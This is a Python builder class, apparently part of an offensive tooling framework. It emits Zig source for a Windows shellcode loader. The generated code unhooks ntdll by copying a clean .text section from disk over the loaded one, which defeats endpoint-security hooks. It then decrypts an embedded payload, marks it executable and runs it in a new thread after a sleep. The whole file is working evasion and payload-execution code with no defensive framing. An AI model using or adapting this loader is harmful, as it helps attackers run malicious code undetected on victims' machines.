#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""ntdll .text restore from disk, then encrypted shellcode — pure Zig."""

from __future__ import annotations

from lib.compile.encrypted_dropper import EncryptedDropperBuilder
from lib.compile.zig_loader_common import zig_decode_decrypt_preamble, zig_sleep_ms, zig_std_preamble


UNHOOK_ZIG = """
const SEC_IMAGE: w.DWORD = 0x1000000;

fn unhookNtdllText() bool {
    const hNtdll = GetModuleHandleA("ntdll.dll") orelse return false;
    const hFile = CreateFileA(
        "C:\\\\Windows\\\\System32\\\\ntdll.dll",
        w.GENERIC_READ,
        w.FILE_SHARE_READ,
        null,
        w.OPEN_EXISTING,
        0,
        null,
    );
    if (hFile == w.INVALID_HANDLE_VALUE) return false;
    defer _ = CloseHandle(hFile);

    const hMap = CreateFileMappingA(hFile, null, w.PAGE_READONLY | SEC_IMAGE, 0, 0, null);
    if (hMap == null) return false;
    defer _ = CloseHandle(hMap.?);

    const clean = MapViewOfFile(hMap, w.FILE_MAP_READ, 0, 0, 0);
    if (clean == null) return false;
    defer _ = UnmapViewOfFile(clean);

    const dos: *const w.IMAGE_DOS_HEADER = @ptrCast(@alignCast(hNtdll));
    const nt: *const w.IMAGE_NT_HEADERS = @ptrCast(@alignCast(@as([*]u8, @ptrCast(hNtdll)) + dos.e_lfanew));
    const numSections = nt.FileHeader.NumberOfSections;
    const section: [*]w.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(
        @as([*]u8, @ptrCast(nt)) + @sizeOf(w.IMAGE_NT_HEADERS),
    ));

    var i: u16 = 0;
    while (i < numSections) : (i += 1) {
        if (!std.mem.eql(u8, section[i].Name[0..5], ".text")) continue;
        const hooked = @as([*]u8, @ptrCast(hNtdll)) + section[i].VirtualAddress;
        const cleanText = @as([*]u8, @ptrCast(clean.?)) + section[i].VirtualAddress;
        const size: w.DWORD = section[i].Misc.VirtualSize;
        var old: w.DWORD = 0;
        if (VirtualProtect(hooked, size, w.PAGE_EXECUTE_READWRITE, &old) == 0) return false;
        @memcpy(hooked[0..size], cleanText[0..size]);
        _ = VirtualProtect(hooked, size, old, &old);
        return true;
    }
    return false;
}
"""


class NtdllUnhookingLoaderBuilder(EncryptedDropperBuilder):

    def build_zig_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        decode = zig_decode_decrypt_preamble(encoded_payload, key, iv, cipher=self.cipher)
        return f"""
{zig_std_preamble()}
{decode}
{UNHOOK_ZIG}

pub fn main() u8 {{
    if (!unhookNtdllText()) return 1;

    var gpa = std.heap.GeneralPurposeAllocator(.{{}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    const sc = decodeAndDecrypt(allocator) catch return 1;
    defer allocator.free(sc);

    const exec = VirtualAlloc(null, sc.len, w.MEM_COMMIT | w.MEM_RESERVE, w.PAGE_READWRITE) orelse return 1;
    @memcpy(@as([*]u8, @ptrCast(exec))[0..sc.len], sc);
    var old: w.DWORD = 0;
    if (VirtualProtect(exec, sc.len, w.PAGE_EXECUTE_READ, &old) == 0) return 1;
{zig_sleep_ms(self.sleep_ms)}
    const thread = CreateThread(null, 0, @ptrCast(exec), null, 0, null);
    if (thread == null) return 1;
    _ = WaitForSingleObject(thread.?, w.INFINITE);
    _ = CloseHandle(thread.?);
    _ = VirtualFree(exec, 0, w.MEM_RELEASE);
    return 0;
}}
"""
